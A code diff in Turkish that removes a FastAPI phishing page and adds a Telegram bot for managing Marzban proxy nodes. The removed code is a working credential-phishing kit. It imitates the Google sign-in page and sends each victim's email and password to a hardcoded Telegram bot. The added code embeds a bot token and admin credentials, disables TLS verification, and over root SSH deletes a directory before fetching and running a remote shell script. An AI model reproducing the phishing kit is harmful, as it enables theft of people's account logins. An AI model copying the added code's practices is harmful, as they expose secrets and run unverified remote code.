@@ -1,171 +1,291 @@
-from fastapi import FastAPI, Request
-from fastapi.responses import HTMLResponse
-import requests  # httpx yerine requests kullan
+import logging
+import requests
+import json
+import subprocess
+import paramiko
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, MessageHandler, filters
 
-app = FastAPI()
+# Loglama ayarları
+logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# --- BURAYA KENDİ BİLGİLERİNİ YAZ ---
-BOT_TOKEN = "8645926434:AAGMsVWcrZ-Str1WSwPae7QIgaS3diAkDQo"  # BotFather'dan aldığın token
-CHAT_ID = "8359722718"      # @userinfobot'tan aldığın sayı
-# --------------------------------------
+# -------------------- KONFIGÜRASYON --------------------
+TOKEN = "8826147048:AAFkZlZOKsS43RWrFXALU90XHO5sviSJkg0"  # Telegram Bot Token
 
-# HTML şablonu (AYNI, DEĞİŞMEDİ)
-HTML_TEMPLATE = """<!DOCTYPE html>
-<html lang="tr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body { background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .container { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .logo { font-size: 28px; font-weight: 500; margin-bottom: 20px; color: #3c4043; }
-        .logo span { color: #4285f4; }
-        .title { font-size: 24px; font-weight: 400; margin-bottom: 8px; color: #202124; }
-        .subtitle { font-size: 16px; color: #5f6368; margin-bottom: 24px; }
-        .subtitle a { color: #1a73e8; text-decoration: none; }
-        .subtitle a:hover { text-decoration: underline; }
-        .input-group { text-align: left; margin-bottom: 16px; }
-        .input-group label { display: block; font-size: 14px; color: #5f6368; margin-bottom: 4px; }
-        .input-group input { width: 100%; padding: 12px 14px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; transition: border 0.2s; }
-        .input-group input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2); }
-        .forgot-email { text-align: left; margin-bottom: 16px; }
-        .forgot-email a { color: #1a73e8; text-decoration: none; font-size: 14px; }
-        .forgot-email a:hover { text-decoration: underline; }
-        .create-account { text-align: left; margin-bottom: 24px; }
-        .create-account a { color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500; }
-        .create-account a:hover { text-decoration: underline; }
-        .button-container { display: flex; justify-content: flex-end; }
-        .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .btn-next:hover { background: #1b66c9; }
-        .step-2 { display: none; }
-        .step-1 { display: block; }
-        .password-options { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
-        .password-options label { font-size: 14px; color: #5f6368; display: flex; align-items: center; gap: 6px; }
-        .password-options a { color: #1a73e8; text-decoration: none; font-size: 14px; }
-        .password-options a:hover { text-decoration: underline; }
-        .error-message { color: #d93025; font-size: 13px; margin-top: 6px; display: none; text-align: left; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div id="step1" class="step-1">
-            <div class="logo">G<span>o</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></div>
-            <div class="title">Oturum açın</div>
-            <div class="subtitle">Google Hesabınızı kullanın. Hesap bu cihaza eklenir ve diğer Google uygulamaları tarafından kullanılabilir.<br><a href="#">Hesabınızı kullanma hakkında daha fazla bilgi</a></div>
-            <div class="input-group">
-                <label for="emailPhone">E-posta veya telefon</label>
-                <input type="text" id="emailPhone" placeholder="E-posta veya telefon">
-                <div id="emailError" class="error-message">Lütfen geçerli bir e-posta veya telefon numarası girin.</div>
-            </div>
-            <div class="forgot-email"><a href="#">E-posta adresinizi mi unuttunuz?</a></div>
-            <div style="display: flex; justify-content: space-between; align-items: center;">
-                <div class="create-account"><a href="#">Hesap oluşturun</a></div>
-                <div class="button-container"><button class="btn-next" onclick="goToStep2()">Sonraki</button></div>
-            </div>
-        </div>
-        <div id="step2" class="step-2">
-            <div class="logo">G<span>o</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></div>
-            <div class="title">Hoş geldiniz</div>
-            <div id="displayEmail" style="font-size: 16px; color: #202124; margin-bottom: 16px; font-weight: 500;"></div>
-            <div class="input-group">
-                <label for="password">Şifrenizi girin</label>
-                <input type="password" id="password" placeholder="Şifrenizi girin">
-                <div id="passwordError" class="error-message">Lütfen şifrenizi girin.</div>
-            </div>
-            <div class="password-options">
-                <label><input type="checkbox" id="showPassword" onchange="togglePassword()"> Şifreyi göster</label>
-                <a href="#">Başka bir yöntem dene</a>
-            </div>
-            <div style="display: flex; justify-content: flex-end; margin-top: 24px;">
-                <button class="btn-next" onclick="sendToTelegram()">Sonraki</button>
-            </div>
-        </div>
-    </div>
-    <script>
-        function goToStep2() {
-            const email = document.getElementById('emailPhone').value.trim();
-            const errorDiv = document.getElementById('emailError');
-            if (email === '') { errorDiv.style.display = 'block'; return; }
-            errorDiv.style.display = 'none';
-            document.getElementById('step1').style.display = 'none';
-            document.getElementById('step2').style.display = 'block';
-            document.getElementById('displayEmail').innerText = email;
-        }
-        function togglePassword() {
-            const passwordInput = document.getElementById('password');
-            const showCheckbox = document.getElementById('showPassword');
-            passwordInput.type = showCheckbox.checked ? 'text' : 'password';
-        }
-        function sendToTelegram() {
-            const email = document.getElementById('displayEmail').innerText;
-            const password = document.getElementById('password').value.trim();
-            const errorDiv = document.getElementById('passwordError');
-            if (password === '') { errorDiv.style.display = 'block'; return; }
-            errorDiv.style.display = 'none';
-            fetch('/send-to-telegram', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    alert('✅ Başarili!');
-                    document.getElementById('emailPhone').value = '';
-                    document.getElementById('password').value = '';
-                    document.getElementById('step2').style.display = 'none';
-                    document.getElementById('step1').style.display = 'block';
-                } else {
-                    alert('❌ Hata: ' + data.message);
-                }
-            })
-            .catch(error => {
-                alert('❌ Bağlantı hatası!');
-                console.error('Hata:', error);
-            });
-        }
-        document.addEventListener('keydown', function(event) {
-            if (event.key === 'Enter') {
-                const step1 = document.getElementById('step1');
-                const step2 = document.getElementById('step2');
-                if (step1.style.display !== 'none') { goToStep2(); }
-                else if (step2.style.display !== 'none') { sendToTelegram(); }
-            }
-        });
-    </script>
-</body>
-</html>"""
+# Marzban Panel Bilgileri
+MARZBAN_URL = "https://vip.fastline-tm-belet-film.ru:8000"  # Kendi panel adresiniz
+MARZBAN_USERNAME = "komutan31"  # Marzban admin kullanıcı adı
+MARZBAN_PASSWORD = "admin"  # Marzban admin şifresi
 
-@app.get("/", response_class=HTMLResponse)
-async def get_index():
-    return HTML_TEMPLATE
+# VPS SSH Bilgileri (node script'ini kurmak için)
+VPS_IP = ""  # Node'un kurulu olduğu VPS IP
+SSH_USERNAME = "root"
+SSH_PASSWORD = "VPS_SIFRESI"  # Veya SSH key kullanabilirsiniz
+NODE_SCRIPT_URL = "https://raw.githubusercontent.com/Marzban/node-script/main/install.sh"  # Node script URL
 
-@app.post("/send-to-telegram")
-async def send_to_telegram(request: Request):
+# Conversation States
+(IP_SOR, SIFRE_SOR) = range(2)
+
+# -------------------- MARZBAN API İŞLEMLERİ --------------------
+def get_marzban_token():
+    """Marzban API'den token alır"""
     try:
-        data = await request.json()
-        email = data.get("email")
-        password = data.get("password")
-        
-        message = f"🔐 Yeni Giriş Bilgileri:\n\n📧 E-posta: {email}\n🔑 Şifre: {password}"
-        
-        # Telegram'a gönder (requests kullanarak)
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        url = f"{MARZBAN_URL}/api/admin/token"
         payload = {
-            "chat_id": CHAT_ID,
-            "text": message,
-            "parse_mode": "HTML"
+            "username": MARZBAN_USERNAME,
+            "password": MARZBAN_PASSWORD
         }
+        response = requests.post(url, json=payload, verify=False)
+        response.raise_for_status()
+        token_data = response.json()
+        return token_data.get("access_token")
+    except Exception as e:
+        logger.error(f"Marzban token alınamadı: {e}")
+        return None
+
+def get_nodes():
+    """Marzban'daki node'ları listeler"""
+    try:
+        token = get_marzban_token()
+        if not token:
+            return None
         
-        response = requests.post(url, json=payload)
+        url = f"{MARZBAN_URL}/api/nodes"
+        headers = {"Authorization": f"Bearer {token}"}
+        response = requests.get(url, headers=headers, verify=False)
+        response.raise_for_status()
+        return response.json()
+    except Exception as e:
+        logger.error(f"Node'lar alınamadı: {e}")
+        return None
+
+def update_node_ip(node_id, new_ip, node_password):
+    """Node IP'sini günceller"""
+    try:
+        token = get_marzban_token()
+        if not token:
+            return False, "Token alınamadı"
         
-        if response.status_code == 200:
-            return {"success": True, "message": "Gönderildi"}
+        # Önce node'u getir
+        url = f"{MARZBAN_URL}/api/nodes/{node_id}"
+        headers = {"Authorization": f"Bearer {token}"}
+        response = requests.get(url, headers=headers, verify=False)
+        response.raise_for_status()
+        node_data = response.json()
+        
+        # IP'yi güncelle
+        node_data["address"] = new_ip
+        
+        # Node'u güncelle (PUT metodunu kullan)
+        response = requests.put(url, json=node_data, headers=headers, verify=False)
+        response.raise_for_status()
+        
+        return True, "Node IP başarıyla güncellendi"
+    except Exception as e:
+        logger.error(f"Node IP güncellenemedi: {e}")
+        return False, f"Hata: {str(e)}"
+
+# -------------------- SSH VE SCRIPT İŞLEMLERİ --------------------
+def update_node_script_on_vps(vps_ip, ssh_user, ssh_password, new_ip, node_password):
+    """VPS'de node script'ini yeni IP ile günceller"""
+    try:
+        # SSH bağlantısı
+        ssh = paramiko.SSHClient()
+        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        ssh.connect(vps_ip, username=ssh_user, password=ssh_password, timeout=10)
+        
+        # Node'u durdur
+        ssh.exec_command("systemctl stop marzban-node")
+        
+        # Script'i indir ve çalıştır
+        command = f"""
+        # Eski node'u temizle
+        rm -rf /opt/marzban-node
+        
+        # Script'i indir
+        curl -s {NODE_SCRIPT_URL} > /tmp/install_node.sh
+        chmod +x /tmp/install_node.sh
+        
+        # Script'i yeni IP ve şifre ile çalıştır
+        bash /tmp/install_node.sh --ip {new_ip} --password {node_password}
+        
+        # Node'u başlat
+        systemctl start marzban-node
+        systemctl enable marzban-node
+        
+        # Durumu kontrol et
+        systemctl status marzban-node --no-pager
+        """
+        
+        stdin, stdout, stderr = ssh.exec_command(command)
+        output = stdout.read().decode()
+        error = stderr.read().decode()
+        
+        ssh.close()
+        
+        if "active (running)" in output or "active (running)" in error:
+            return True, "VPS'de node script başarıyla güncellendi"
         else:
-            # Hata detayını döndür
-            return {"success": False, "message": f"Telegram hatası: {response.text}"}
+            return False, f"Script hatası: {error or output}"
             
     except Exception as e:
-        return {"success": False, "message": f"Sunucu hatası: {str(e)}"}
+        logger.error(f"VPS'de script güncellenemedi: {e}")
+        return False, f"SSH hatası: {str(e)}"
+
+# -------------------- TELEGRAM BOT KOMUTLARI --------------------
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    server_status = (
+        "🛡 GÜVENLİK KONTROL PANELİ\n\n"
+        "🌐 SUNUCU DURUMU\n"
+        "Marzban Node Yönetimi\n"
+        "Sistem Durumu: 🟢 Aktif\n\n"
+        "⚙️ NODE YAPILANDIRMA\n"
+        "IP Değiştirme ve Güncelleme"
+    )
+    
+    keyboard = [
+        [InlineKeyboardButton("🔄 IP Değiştir", callback_data='ip_degistir')],
+        [InlineKeyboardButton("📊 Node Durumu", callback_data='node_durum')],
+        [InlineKeyboardButton("🔄 Node Yeniden Başlat", callback_data='node_restart')]
+    ]
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.message.reply_text(server_status, reply_markup=reply_markup, parse_mode="Markdown")
+
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == 'ip_degistir':
+        await query.edit_message_text(
+            "📝 **Yeni IP Adresini Girin:**\n\n"
+            "Örnek: 192.168.1.100\n"
+            "İptal etmek için /cancel yazın."
+        )
+        return IP_SOR
+    
+    elif query.data == 'node_durum':
+        nodes = get_nodes()
+        if nodes:
+            status_text = "📊 **NODE DURUMU**\n\n"
+            for node in nodes:
+                status_text += f"🔹 {node.get('name', 'İsimsiz')}\n"
+                status_text += f"   IP: {node.get('address', 'Bilinmiyor')}\n"
+                status_text += f"   Durum: {'🟢 Aktif' if node.get('status') else '🔴 Pasif'}\n"
+                status_text += f"   Port: {node.get('port', 'Bilinmiyor')}\n\n"
+            await query.edit_message_text(status_text)
+        else:
+            await query.edit_message_text("❌ Node bilgileri alınamadı!")
+            
+    elif query.data == 'node_restart':
+        await query.edit_message_text("🔄 Node yeniden başlatılıyor...")
+        success, message = update_node_script_on_vps(
+            VPS_IP, SSH_USERNAME, SSH_PASSWORD, 
+            "mevcut_ip", "mevcut_sifre"
+        )
+        await query.edit_message_text(f"✅ {message}" if success else f"❌ {message}")
+
+# -------------------- IP VE ŞİFRE ALMA KONUŞMASI --------------------
+async def ip_al(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    new_ip = update.message.text.strip()
+    
+    # Basit IP kontrolü
+    import re
+    ip_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
+    if not re.match(ip_pattern, new_ip):
+        await update.message.reply_text("❌ Geçersiz IP formatı! Lütfen tekrar deneyin (örn: 192.168.1.100)")
+        return IP_SOR
+    
+    context.user_data['new_ip'] = new_ip
+    await update.message.reply_text(
+        "🔑 **Node Şifresini Girin:**\n\n"
+        "Node'a bağlanmak için kullanılacak şifre.\n"
+        "İptal etmek için /cancel yazın."
+    )
+    return SIFRE_SOR
+
+async def sifre_al(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    node_password = update.message.text.strip()
+    
+    if len(node_password) < 6:
+        await update.message.reply_text("❌ Şifre en az 6 karakter olmalı! Tekrar deneyin.")
+        return SIFRE_SOR
+    
+    context.user_data['node_password'] = node_password
+    new_ip = context.user_data['new_ip']
+    node_password = context.user_data['node_password']
+    
+    await update.message.reply_text(
+        f"⏳ **İşlem Başlatılıyor...**\n\n"
+        f"📌 Yeni IP: `{new_ip}`\n"
+        f"🔑 Şifre: `{node_password}`\n\n"
+        f"Bu işlem 2-3 dakika sürebilir..."
+    )
+    
+    try:
+        # 1. Marzban'daki node IP'sini güncelle
+        nodes = get_nodes()
+        if not nodes:
+            await update.message.reply_text("❌ Node listesi alınamadı!")
+            return ConversationHandler.END
+            
+        node_id = nodes[0]['id']  # İlk node'u al
+        
+        success, message = update_node_ip(node_id, new_ip, node_password)
+        if not success:
+            await update.message.reply_text(f"❌ Marzban güncelleme hatası: {message}")
+            return ConversationHandler.END
+        
+        await update.message.reply_text("✅ Marzban panel güncellendi")
+        
+        # 2. VPS'de node script'ini güncelle
+        await update.message.reply_text("📦 VPS'de node script güncelleniyor...")
+        
+        success, message = update_node_script_on_vps(
+            VPS_IP, SSH_USERNAME, SSH_PASSWORD,
+            new_ip, node_password
+        )
+        
+        if success:
+            await update.message.reply_text(
+                f"✅ **İŞLEM BAŞARIYLA TAMAMLANDI!**\n\n"
+                f"🌐 Yeni IP: `{new_ip}`\n"
+                f"🔑 Yeni Şifre: `{node_password}`\n\n"
+                f"Node artık yeni IP ile çalışıyor."
+            )
+        else:
+            await update.message.reply_text(f"❌ VPS güncelleme hatası: {message}")
+            
+    except Exception as e:
+        await update.message.reply_text(f"❌ Beklenmeyen hata: {str(e)}")
+    
+    return ConversationHandler.END
+
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    await update.message.reply_text("❌ İşlem iptal edildi.")
+    return ConversationHandler.END
+
+# -------------------- ANA FONKSİYON --------------------
+def main():
+    application = Application.builder().token(TOKEN).build()
+    
+    # Conversation handler (IP ve şifre alma)
+    conv_handler = ConversationHandler(
+        entry_points=[CallbackQueryHandler(button_handler, pattern='ip_degistir')],
+        states={
+            IP_SOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, ip_al)],
+            SIFRE_SOR: [MessageHandler(filters.TEXT & ~filters.COMMAND, sifre_al)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(conv_handler)
+    application.add_handler(CallbackQueryHandler(button_handler))
+    
+    print("🚀 Bot başarıyla başlatıldı...")
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
